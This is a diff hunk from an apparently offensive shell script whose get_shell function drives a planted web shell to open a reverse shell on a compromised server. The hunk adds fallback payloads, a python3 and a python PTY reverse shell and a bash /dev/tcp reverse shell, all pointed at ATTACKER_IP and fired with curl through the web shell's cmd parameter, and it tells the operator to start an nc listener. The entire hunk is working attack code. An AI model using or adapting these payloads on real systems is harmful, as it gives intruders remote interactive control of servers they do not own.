@@ -131,9 +131,20 @@ get_shell() {
     log_warn "Start listener: nc -lvnp ${ATTACKER_PORT}"
     read -p "Press ENTER when listener is ready..."
 
-    # Python PTY reverse shell + setsid (detached dari PHP-FPM)
-    CMD="setsid python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect((\"${ATTACKER_IP}\",${ATTACKER_PORT}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")' &"
-    CMD_ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${CMD}'))")
+    # Coba python3, fallback python, fallback bash
+    if curl -sk "${USER_API}/${ROOT_SHELL_NAME}?cmd=which+python3" 2>/dev/null | grep -q "python3"; then
+        log_info "Using python3 reverse shell..."
+        CMD="setsid python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect((\"${ATTACKER_IP}\",${ATTACKER_PORT}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")' &"
+        CMD_ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${CMD}'))")
+    elif curl -sk "${USER_API}/${ROOT_SHELL_NAME}?cmd=which+python" 2>/dev/null | grep -q "python"; then
+        log_info "Using python reverse shell..."
+        CMD="setsid python -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect((\"${ATTACKER_IP}\",${ATTACKER_PORT}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")' &"
+        CMD_ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${CMD}'))")
+    else
+        log_warn "python/python3 not found, falling back to bash reverse shell..."
+        CMD="setsid bash -c 'bash -i >& /dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT} 0>&1' &"
+        CMD_ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${CMD}'))")
+    fi
 
     curl -sk "${USER_API}/${ROOT_SHELL_NAME}?cmd=${CMD_ENC}" > /dev/null 2>&1
     log_success "Reverse shell triggered. Check your listener."
